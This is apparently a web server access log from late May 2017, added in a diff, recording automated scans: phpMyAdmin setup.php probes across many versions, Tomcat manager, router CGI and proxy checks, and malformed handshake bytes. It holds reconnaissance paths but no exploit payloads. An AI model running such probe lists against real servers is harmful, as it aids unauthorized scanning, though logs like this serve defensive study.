+93.174.95.47 - - [23/May/2017 20:46:22] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 -
+93.174.95.47 - - [23/May/2017 20:46:22] "GET /pma/scripts/setup.php HTTP/1.1" 404 -
+93.174.95.47 - - [23/May/2017 20:46:22] "GET /myadmin/scripts/setup.php HTTP/1.1" 404 -
+93.174.95.47 - - [23/May/2017 20:46:23] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 404 -
+93.174.95.47 - - [23/May/2017 20:46:23] "GET /scripts/setup.php HTTP/1.1" 404 -
+211.144.157.50 - - [23/May/2017 22:00:48] "GET /manager/html HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:03] "GET /mysql/pMA/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:04] "GET /sql/phpmanager/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:04] "GET /sql/php-myadmin/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:04] "GET /sql/phpmy-admin/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:05] "GET /sql/sql/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:05] "GET /sql/myadmin/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:06] "GET /sql/webadmin/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:06] "GET /sql/sqlweb/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:06] "GET /sql/websql/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:06] "GET /sql/webdb/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:07] "GET /sql/sqladmin/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:07] "GET /sql/sql-admin/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:07] "GET /sql/phpmyadmin2/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:08] "GET /sql/phpMyAdmin2/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:08] "GET /sql/phpMyAdmin/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:08] "GET /db/myadmin/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:09] "GET /db/webadmin/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:09] "GET /db/dbweb/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:09] "GET /db/websql/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:10] "GET /db/webdb/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:10] "GET /db/dbadmin/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:10] "GET /db/db-admin/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:11] "GET /db/phpmyadmin3/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:11] "GET /db/phpMyAdmin3/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:11] "GET /db/phpMyAdmin-3/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:12] "GET /administrator/phpmyadmin/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:12] "GET /administrator/phpMyAdmin/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:12] "GET /administrator/db/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:12] "GET /administrator/web/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:13] "GET /administrator/pma/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:13] "GET /administrator/PMA/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:13] "GET /administrator/admin/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:14] "GET /phpMyAdmin2/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:14] "GET /phpMyAdmin3/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:14] "GET /phpMyAdmin4/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:15] "GET /phpMyAdmin-3/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:15] "GET /php-my-admin/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:15] "GET /PMA2012/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:16] "GET /pma2012/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:16] "GET /PMA2011/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:16] "GET /pma2011/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:16] "GET /phpmanager/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:17] "GET /administrator/phpMyAdmin/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:17] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:18] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:18] "GET /pma/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:18] "GET /myadmin/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:19] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:19] "GET /scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:19] "GET /admin/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:19] "GET /admin/pma/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:20] "GET /admin/phpmyadmin/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:20] "GET /db/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:20] "GET /dbadmin/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:21] "GET /mysql/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:21] "GET /mysqladmin/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:21] "GET /web/phpMyAdmin/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:22] "GET /web/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:22] "GET /_phpmyadmin/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:22] "GET /administrator/phpmyadmin/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:23] "GET /administrator/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:23] "GET /tmUnblock.cgi HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:23] "GET /cgi?2 HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:24] "GET /hndUnblock.cgi HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:24] "GET /recordings/index.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:24] "GET /cgi/common.cgi HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:24] "GET /manager/html HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:25] "GET /cgi/common.cgi HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:25] "GET /stssys.htm HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:25] "GET /command.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:26] "GET /plugins/weathermap/editor.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:26] "GET /robots.txt HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:26] "GET /apps/ippbx/recordings/recordings.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:27] "GET /CFIDE/administrator/ HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:27] "GET /favicon.ico HTTP/1.1" 200 -
+94.102.49.175 - - [24/May/2017 00:20:27] "GET /current_config/Account1 HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:28] "GET /phpMyAdmin-2.10.0.0/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:28] "GET /phpMyAdmin-2.10.0.1/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:28] "GET /phpMyAdmin-2.10.0.2/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:29] "GET /phpMyAdmin-2.10.0/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:29] "GET /phpMyAdmin-2.10.1.0/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:29] "GET /phpMyAdmin-2.10.2.0/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:30] "GET /phpMyAdmin-2.11.0.0/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:30] "GET /phpMyAdmin-2.11.1-all-languages/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:30] "GET /phpMyAdmin-2.11.1.0/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:31] "GET /phpMyAdmin-2.11.1.1/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:31] "GET /phpMyAdmin-2.11.1.2/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:31] "GET /phpMyAdmin-2.6.1-pl2/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:32] "GET /phpMyAdmin-2.6.1-pl3/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:32] "GET /phpMyAdmin-2.6.4-pl3/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:32] "GET /phpMyAdmin-2.6.4-pl4/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:33] "GET /phpMyAdmin-2.6.4-rc1/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:33] "GET /phpMyAdmin-2.6.5/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:33] "GET /phpMyAdmin-2.6.6/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:33] "GET /phpMyAdmin-2.6.9/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:34] "GET /phpMyAdmin-2.7.0-beta1/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:34] "GET /phpMyAdmin-2.7.0-pl1/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:35] "GET /phpMyAdmin-2.7.0-pl2/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:35] "GET /phpMyAdmin-2.7.0-rc1/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:35] "GET /phpMyAdmin-2.7.5/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:35] "GET /phpMyAdmin-2.7.6/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:36] "GET /phpMyAdmin-2.7.7/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:36] "GET /phpMyAdmin-2.8.2.3/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:36] "GET /phpMyAdmin-2.8.2/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:37] "GET /phpMyAdmin-2.8.3/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:37] "GET /phpMyAdmin-2.8.4/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:38] "GET /phpMyAdmin-2.8.5/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:38] "GET /phpMyAdmin-2.8.6/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:38] "GET /phpMyAdmin-2.8.7/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:38] "GET /phpMyAdmin-2.8.8/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:39] "GET /phpMyAdmin-2.8.9/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:39] "GET /phpMyAdmin-2.9.0-rc1/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:39] "GET /phpMyAdmin-2.9.0.1/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:40] "GET /phpMyAdmin-2.9.0.2/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:40] "GET /phpMyAdmin-2.9.0/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:41] "GET /phpMyAdmin-2.9.1/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:41] "GET /phpMyAdmin-2.9.2/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:41] "GET /phpMyAdmin-2/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:41] "GET /phpMyAdmin-3.0.0-rc1-english/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:42] "GET /phpMyAdmin-3.0.0.0-all-languages/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:42] "GET /phpMyAdmin-3.0.1.0-english/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:42] "GET /phpMyAdmin-3.0.1.0/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:43] "GET /phpMyAdmin-3.0.1.1/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:43] "GET /phpMyAdmin-3.1.0.0-english/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:43] "GET /phpMyAdmin-3.1.0.0/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:44] "GET /phpMyAdmin-3.1.1.0-all-languages/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:44] "GET /phpMyAdmin-3.1.2.0-all-languages/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:44] "GET /phpMyAdmin-3.1.2.0-english/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:45] "GET /phpMyAdmin-3.1.2.0/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:45] "GET /phpMyAdmin-3.4.3.1/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:45] "GET /phpMyAdmin2/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:46] "GET /phpMyAdmin3/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:46] "GET /administrator/components/com_joommyadmin/phpmyadmin/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:46] "GET /apache-default/phpmyadmin/scripts/setup.php HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:47] "GET  HTTP/1.1" 404 -
+94.102.49.175 - - [24/May/2017 00:20:47] "GET  HTTP/1.1" 404 -
+52.187.22.33 - - [24/May/2017 01:01:51] "GET /manager/html HTTP/1.1" 404 -
+209.126.136.5 - - [24/May/2017 03:57:14] "GET / HTTP/1.1" 200 -
+113.225.211.248 - - [24/May/2017 04:54:11] "GET / HTTP/1.1" 200 -
+54.146.35.213 - - [24/May/2017 08:31:20] "HEAD / HTTP/1.1" 200 -
+160.178.169.58 - - [24/May/2017 17:36:59] "GET / HTTP/1.0" 200 -
+189.34.244.18 - - [24/May/2017 17:44:37] "GET /hndUnblock.cgi HTTP/1.0" 404 -
+189.34.244.18 - - [24/May/2017 17:44:38] "GET /tmUnblock.cgi HTTP/1.0" 404 -
+180.97.106.162 - - [24/May/2017 17:51:51] "HEAD http://180.163.113.82/check_proxy HTTP/1.1" 404 -
+35.184.49.97 - - [24/May/2017 19:07:22] "GET /muieblackcat HTTP/1.1" 404 -
+35.184.49.97 - - [24/May/2017 19:07:22] "GET //phpMyAdmin/scripts/setup.php HTTP/1.1" 404 -
+35.184.49.97 - - [24/May/2017 19:07:22] "GET //phpmyadmin/scripts/setup.php HTTP/1.1" 404 -
+35.184.49.97 - - [24/May/2017 19:07:22] "GET //pma/scripts/setup.php HTTP/1.1" 404 -
+35.184.49.97 - - [24/May/2017 19:07:22] "GET //myadmin/scripts/setup.php HTTP/1.1" 404 -
+35.184.49.97 - - [24/May/2017 19:07:22] "GET //MyAdmin/scripts/setup.php HTTP/1.1" 404 -
+80.82.77.33 - - [24/May/2017 20:06:48] code 400, message Bad request syntax ('\x01I20100')
+80.82.77.33 - - [24/May/2017 20:06:48] "I20100" 400 -
+168.1.128.53 - - [24/May/2017 21:10:39] "GET / HTTP/1.1" 200 -
+180.97.106.162 - - [25/May/2017 01:26:14] code 400, message Bad request syntax ('\x04\x01\x00P\xb4\xa3qR\x00')
+180.97.106.162 - - [25/May/2017 01:26:14] "P¥£qR" 400 -
+185.40.4.109 - - [25/May/2017 03:50:26] "GET /recordings/ HTTP/1.1" 404 -
+185.40.4.109 - - [25/May/2017 03:50:26] "GET / HTTP/1.1" 200 -
+185.40.4.109 - - [25/May/2017 03:50:28] code 400, message Bad request syntax ('\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03s@\xa8\x9f\x83\xfe7._\x11\x
+e8\xf6t\xa0\x88|R\xda\x9f\xb9\xde\xf0XiS\x86`\xd6\x96\x80\xe9\xeb\x00\x006\xc0,\xc0')
+185.40.4.109 - - [25/May/2017 03:50:28] "òîs@®üÉ˛7._t†à|R⁄üπXiSÜ`÷ñÄ6¿,¿" 400 -
+185.40.4.109 - - [25/May/2017 03:50:28] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03._L\x19[\xf0\x86\xf8
+\x13\x83Ni\xc7n\xe8\x1f$\x97')
+185.40.4.109 - - [25/May/2017 03:50:28] "òî._L[ÉNi$ó
+                                                    Éuë" 400 -
+185.40.4.109 - - [25/May/2017 03:50:28] code 400, message Bad request syntax ('\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03r\x15+3\x9a\xe27\xc4F\xfc\x
+1b\x97\x0f\x9e\xf0\xe1\xd4\xd6\xe7IF\x05\xeew\xfdS9&\xeb\x08\xfd\x1d\x00\x006\xc0,\xc0')
+185.40.4.109 - - [25/May/2017 03:50:28] "òîr+3ö¸F˝S9&˝6¿,¿" 400 -
+180.97.106.37 - - [25/May/2017 03:56:56] code 400, message Bad request syntax ('\x05\x02\x00\x02')
+180.97.106.37 - - [25/May/2017 03:56:56] "" 400 -
+71.6.202.196 - - [25/May/2017 04:07:22] "GET / HTTP/1.0" 200 -
+101.236.19.89 - - [25/May/2017 05:24:19] "GET / HTTP/1.0" 200 -
+84.30.51.11 - - [25/May/2017 08:54:06] "GET / HTTP/1.1" 200 -
+60.191.38.77 - - [25/May/2017 11:55:30] "GET /current_config/Account1 HTTP/1.1" 404 -
+222.186.21.102 - - [25/May/2017 15:22:11] "GET / HTTP/1.1" 200 -
+168.1.128.54 - - [25/May/2017 15:32:54] "GET / HTTP/1.0" 200 -
+59.40.51.205 - - [25/May/2017 15:45:12] "GET login.cgi HTTP/1.0" 404 -
+80.15.195.28 - - [25/May/2017 18:41:46] "GET / HTTP/1.1" 200 -
+79.136.62.35 - - [25/May/2017 19:38:00] "GET login.cgi HTTP/1.0" 404 -
+139.162.114.70 - - [26/May/2017 02:21:32] "GET / HTTP/1.1" 200 -
+118.193.173.164 - - [26/May/2017 08:27:44] "GET / HTTP/1.1" 200 -
+118.193.173.164 - - [26/May/2017 08:27:48] "GET / HTTP/1.1" 200 -
+181.39.16.231 - - [26/May/2017 08:42:31] "GET / HTTP/1.1" 200 -
+161.22.62.89 - - [26/May/2017 09:05:17] "GET / HTTP/1.1" 200 -
+91.196.50.33 - - [26/May/2017 10:09:18] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 -
+183.129.160.229 - - [26/May/2017 12:21:43] "GET / HTTP/1.1" 200 -
+113.225.214.70 - - [26/May/2017 13:27:12] "GET / HTTP/1.1" 200 -
+199.188.104.73 - - [26/May/2017 13:54:06] "GET / HTTP/1.1" 200 -
+54.80.70.27 - - [26/May/2017 14:32:24] "HEAD / HTTP/1.1" 200 -
+199.188.104.73 - - [26/May/2017 15:30:34] "GET / HTTP/1.1" 200 -
+47.203.93.185 - - [26/May/2017 17:19:57] "GET http://httpheader.net/ HTTP/1.1" 200 -
+47.203.93.185 - - [26/May/2017 17:20:07] code 400, message Bad request syntax ('\x04\x01\x00P\xc0c\xf660\x00')
+47.203.93.185 - - [26/May/2017 17:20:07] "P¿cˆ60" 400 -
+47.203.93.185 - - [26/May/2017 17:20:18] code 400, message Bad request syntax ('\x05\x01\x00')
+47.203.93.185 - - [26/May/2017 17:20:18] "" 400 -
+47.203.93.185 - - [26/May/2017 17:20:28] code 400, message Bad request syntax ('\x05\x01\x00')
+47.203.93.185 - - [26/May/2017 17:20:28] "" 400 -
+110.8.84.231 - - [26/May/2017 17:52:50] "GET / HTTP/1.1" 200 -
+139.162.124.167 - - [26/May/2017 20:48:37] "GET / HTTP/1.1" 200 -
+139.162.119.197 - - [26/May/2017 21:42:51] "GET / HTTP/1.1" 200 -
+183.129.160.229 - - [27/May/2017 01:29:18] "GET / HTTP/1.1" 200 -
+91.196.50.33 - - [27/May/2017 02:09:54] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 -
+181.231.164.241 - - [27/May/2017 10:08:19] "GET / HTTP/1.0" 200 -
+173.212.229.241 - - [27/May/2017 10:40:43] code 400, message Bad request syntax ('\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03Y);\x88\xaf\x84\xa2\x10\
+xdf\x05?\xa5\xa4\xc5\xceB\xbd\x95\x9d\x8c/\x91\x00\x04\xccl\x8f\xec1\xb4\x89\x19\x00\x00*\xc0+\xc0/\x00\x9e\xc0')
+173.212.229.241 - - [27/May/2017 10:40:43] "òîY);àØÑ¢?•§BΩïùå/ëè¥â*¿+¿/û¿" 400 -
+173.212.229.241 - - [27/May/2017 10:40:44] "GET /recordings/ HTTP/1.1" 404 -
+163.172.99.10 - - [27/May/2017 11:03:51] code 400, message Bad request syntax ("\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03?\xd7d\xe0\x19\x85\xd9\x16
+wg\x85\x8bw(\xd5\x8b\xec\xd9\x98[\xda\x82;\x07\x01\x8c\x04.U'\x85\xb6\x00\x006\xc0,\xc0")
+163.172.99.10 - - [27/May/2017 11:03:51] "òî?ÖwgÖãw(’ãò[⁄Ç;å.U'Ö∂6¿,¿" 400 -
+42.114.98.165 - - [27/May/2017 11:17:52] "GET login.cgi HTTP/1.0" 404 -
+60.191.38.77 - - [27/May/2017 12:06:48] "GET /current_config/Account1 HTTP/1.1" 404 -
+95.213.184.251 - - [27/May/2017 17:15:36] "GET / HTTP/1.1" 200 -
+91.196.50.33 - - [27/May/2017 18:29:51] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 -
+80.82.77.139 - - [27/May/2017 22:21:11] "GET / HTTP/1.1" 200 -
+80.82.77.139 - - [27/May/2017 22:21:12] "GET /robots.txt HTTP/1.1" 404 -
+80.82.77.139 - - [27/May/2017 22:21:12] "GET /sitemap.xml HTTP/1.1" 404 -
+42.248.245.236 - - [27/May/2017 23:39:02] "GET login.cgi HTTP/1.0" 404 -
+192.186.2.10 - - [28/May/2017 00:13:35] "GET / HTTP/1.1" 200 -
+104.239.230.53 - - [28/May/2017 00:23:05] "GET / HTTP/1.1" 200 -
+104.239.230.53 - - [28/May/2017 00:23:05] "GET / HTTP/1.1" 200 -
+104.239.230.53 - - [28/May/2017 00:23:05] "GET / HTTP/1.1" 200 -
+193.70.46.94 - - [28/May/2017 00:46:02] "GET / HTTP/1.1" 200 -
+95.213.184.251 - - [28/May/2017 08:17:11] "GET / HTTP/1.1" 200 -
+139.162.124.167 - - [28/May/2017 09:35:58] "GET / HTTP/1.1" 200 -
+91.196.50.33 - - [28/May/2017 10:26:03] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 -
+45.55.8.202 - - [28/May/2017 10:33:11] "OPTIONS / HTTP/1.1" 200 -
+123.56.218.29 - - [28/May/2017 13:11:51] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 -
+123.56.218.29 - - [28/May/2017 13:11:51] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 -
+123.56.218.29 - - [28/May/2017 13:11:52] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 -
+123.56.218.29 - - [28/May/2017 13:11:52] "GET /pma/scripts/setup.php HTTP/1.1" 404 -
+123.56.218.29 - - [28/May/2017 13:11:53] "GET /myadmin/scripts/setup.php HTTP/1.1" 404 -
+123.56.218.29 - - [28/May/2017 13:11:53] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 404 -
+123.56.218.29 - - [28/May/2017 13:11:53] "GET  HTTP/1.1" 404 -
+189.163.93.96 - - [28/May/2017 14:23:07] "GET login.cgi HTTP/1.0" 404 -
+179.105.103.78 - - [28/May/2017 17:13:22] "GET /cgi/common.cgi HTTP/1.0" 404 -
+179.105.103.78 - - [28/May/2017 17:13:23] "GET /stssys.htm HTTP/1.0" 404 -
+179.105.103.78 - - [28/May/2017 17:13:23] "GET / HTTP/1.0" 200 -
+179.105.103.78 - - [28/May/2017 17:13:24] "POST /command.php HTTP/1.0" 405 -
+141.212.122.64 - - [28/May/2017 20:31:40] "GET /x HTTP/1.1" 404 -
+138.197.71.7 - - [28/May/2017 23:26:40] "POST /_vti_bin/_vti_aut/author.dll HTTP/1.1" 405 -
+91.196.50.33 - - [29/May/2017 02:32:49] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 -
+66.102.6.10 - - [29/May/2017 03:55:26] "GET / HTTP/1.1" 200 -
+66.102.6.10 - - [29/May/2017 03:55:27] "GET /favicon.ico HTTP/1.1" 200 -
+23.244.78.26 - - [29/May/2017 05:01:23] "GET /phpmyadmin HTTP/1.1" 404 -
+217.182.136.154 - - [29/May/2017 07:10:45] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 -
+60.191.38.77 - - [29/May/2017 07:32:21] "GET /current_config/Account1 HTTP/1.1" 404 -
+38.107.180.172 - - [29/May/2017 09:33:52] "GET / HTTP/1.1" 200 -
+159.203.165.44 - - [29/May/2017 10:11:37] "GET /main.action HTTP/1.1" 404 -
+159.203.165.44 - - [29/May/2017 10:11:37] "GET /main.action HTTP/1.1" 404 -
+159.203.165.44 - - [29/May/2017 10:11:37] "GET /main.action HTTP/1.1" 404 -
+139.162.108.53 - - [29/May/2017 13:44:57] "GET / HTTP/1.1" 200 -
+91.196.50.33 - - [29/May/2017 16:18:56] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 -
+106.75.61.227 - - [29/May/2017 17:28:17] "GET / HTTP/1.0" 200 -
+34.195.155.15 - - [29/May/2017 18:33:31] "GET / HTTP/1.1" 200 -
+47.203.93.185 - - [29/May/2017 20:15:14] "GET http://httpheader.net/ HTTP/1.1" 200 -
+47.203.93.185 - - [29/May/2017 20:15:24] code 400, message Bad request syntax ('\x04\x01\x00P\xc0c\xf660\x00')
+47.203.93.185 - - [29/May/2017 20:15:24] "P¿cˆ60" 400 -
+47.203.93.185 - - [29/May/2017 20:15:34] code 400, message Bad request syntax ('\x05\x01\x00')
+47.203.93.185 - - [29/May/2017 20:15:34] "" 400 -
+47.203.93.185 - - [29/May/2017 20:15:45] code 400, message Bad request syntax ('\x05\x01\x00')
+47.203.93.185 - - [29/May/2017 20:15:45] "" 400 -
+47.203.93.185 - - [29/May/2017 22:00:15] "GET http://httpheader.net/ HTTP/1.1" 200 -
+47.203.93.185 - - [29/May/2017 22:00:25] code 400, message Bad request syntax ('\x04\x01\x00P\xc0c\xf660\x00')
+47.203.93.185 - - [29/May/2017 22:00:25] "P¿cˆ60" 400 -
